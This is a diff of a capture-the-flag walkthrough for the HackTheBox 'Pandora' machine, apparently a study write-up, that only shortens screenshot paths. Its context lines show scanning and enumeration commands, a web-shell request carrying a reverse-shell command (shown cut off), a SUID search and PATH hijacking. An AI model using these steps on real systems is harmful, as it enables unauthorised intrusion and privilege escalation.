@@ -45,7 +45,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.10.11.136
 ```
 
-![ping](cases/HackTheBox/Machines/EASY/Pandora/screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The host responds, confirming it is alive.
 
@@ -66,7 +66,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.136 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![allports](cases/HackTheBox/Machines/EASY/Pandora/screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract open ports:
 
@@ -74,7 +74,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![extractports](cases/HackTheBox/Machines/EASY/Pandora/screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -91,7 +91,7 @@ nmap -p22,80 -sC -sV 10.10.11.136 -oN targeted
 - `-oN`: Output in human-readable format  
 
 
-![targeted](cases/HackTheBox/Machines/EASY/Pandora/screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 | Port | Service | Version/Description |
 |------|---------|---------------------|
@@ -103,7 +103,7 @@ nmap -p22,80 -sC -sV 10.10.11.136 -oN targeted
 
 Check Ubuntu release via **launchpad**:
 
-![launchpad](cases/HackTheBox/Machines/EASY/Pandora/screenshots/launchpad.png)
+![launchpad](screenshots/launchpad.png)
 
 Ubuntu version: **Focal**.
 
@@ -113,7 +113,7 @@ Fingerprint web technologies:
 whatweb http://10.10.11.136
 ```
 
-![whatweb](cases/HackTheBox/Machines/EASY/Pandora/screenshots/whatweb.png)
+![whatweb](screenshots/whatweb.png)
 
 Interesting findings:
 - Domain â†’ `panda.htb`
@@ -121,11 +121,11 @@ Interesting findings:
 
 Browsing main page:
 
-![web](cases/HackTheBox/Machines/EASY/Pandora/screenshots/web.png)
+![web](screenshots/web.png)
 
 Contact form confirms valid emails:
 
-![web_contact](cases/HackTheBox/Machines/EASY/Pandora/screenshots/web_contact.png)
+![web_contact](screenshots/web_contact.png)
 
 ### 2.1 Directory Enumeration
 
@@ -136,7 +136,7 @@ Continue the attack chain with the next commands:
 gobuster dir -u http://panda.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
 ```
 
-![gobuster](cases/HackTheBox/Machines/EASY/Pandora/screenshots/gobuster.png)
+![gobuster](screenshots/gobuster.png)
 
 Results:
 - `/assets/` â†’ Directory listing but nothing useful  
@@ -197,7 +197,7 @@ Look for unusual **SUID** binaries and other quick wins from the low-privilege s
 find -perm -4000 2>/dev/null
 ```
 
-![priv](cases/HackTheBox/Machines/EASY/Pandora/screenshots/priv.png)
+![priv](screenshots/priv.png)
 
 Suspicious binary: `pandora_backup`.
 
@@ -287,7 +287,7 @@ http://127.0.0.1/pandora_console/images/0.Pwn3d/cmd.php?cmd=bash -c "bash -i >%2
 ![pandora_console_netcat](pandora_console_netcat.png)
 
 âœ… **User flag obtained**  
-![user_flag](cases/HackTheBox/Machines/EASY/Pandora/screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 ---
 ## 4. Privilege Escalation
@@ -301,7 +301,7 @@ ssh-keygen
 ```
 
 ![ssh_id_rsa](ssh_id_rsa.png)  
-![id_rsa](cases/HackTheBox/Machines/EASY/Pandora/screenshots/id_rsa.png)
+![id_rsa](screenshots/id_rsa.png)
 
 Connect as matt:
 
@@ -347,7 +347,7 @@ echo $PATH
 ![path_hijacking](path_hijacking.png)
 
 ðŸ **Root flag obtained**  
-![root_flag](cases/HackTheBox/Machines/EASY/Pandora/screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 ---
 # âœ… MACHINE COMPLETE
